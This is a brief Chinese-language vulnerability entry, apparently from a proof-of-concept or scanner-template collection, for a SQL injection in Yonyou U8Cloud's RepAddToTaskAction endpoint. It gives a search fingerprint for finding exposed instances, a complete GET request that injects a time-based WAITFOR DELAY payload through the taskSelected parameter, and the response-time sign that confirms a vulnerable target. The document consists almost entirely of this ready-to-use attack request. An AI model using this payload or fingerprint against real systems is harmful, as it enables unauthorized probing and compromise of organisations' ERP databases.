# 用友U8CloudRepAddToTaskActionSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title=="U8C"`
- **请求**：`GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s